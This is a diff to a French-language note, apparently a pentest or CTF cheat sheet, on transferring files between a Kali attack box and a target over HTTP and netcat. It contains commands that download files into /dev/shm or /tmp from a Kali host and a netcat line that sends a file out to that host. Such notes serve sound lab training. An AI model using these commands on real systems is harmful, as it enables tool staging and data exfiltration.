@@ -21,9 +21,9 @@ date: 2025-11-26T16:38:12+01:00
 
   ```bash
   cd /chemin/du/fichier (/dev/shm ou /tmp)
-  wget http://IP_KALI:8000/fichier
+  wget http://<adresse tun0 de kali>:8000/fichier
   # ou
-  curl -O http://IP_KALI:8000/fichier
+  curl -O http://<adresse tun0 de kali>:8000/fichier
   ```
   
   ------
@@ -84,7 +84,7 @@ date: 2025-11-26T16:38:12+01:00
 
   ```bash
   cd /chemin/du/fichier
-  nc IP_KALI 4444 < fichier_a_envoyer
+  nc <adresse tun0 de kali> 4444 < fichier_a_envoyer
   ```
   
   ------
@@ -92,4 +92,4 @@ date: 2025-11-26T16:38:12+01:00
 ##  **Résumé en une phrase**
 
   - **HTTP** : la machine qui envoie lance un petit serveur (`python3 -m http.server`), l'autre télécharge avec `wget` ou `curl`.
-  - **Netcat** : la machine qui reçoit écoute (`nc -lnvp 4444 > fichier`), l'autre se connecte et envoie (`nc IP 4444 < fichier`).
+  - **Netcat** : la machine qui reçoit écoute (`nc -lnvp 4444 > fichier`), l'autre se connecte et envoie (`nc IP 4444 < fichier`). Le port utilisé peut être choisi librement, à condition qu’il soit ouvert et disponible sur la machine qui reçoit. On utilise en général le `4444` mais moi j'aime bien aussi le `12345`.
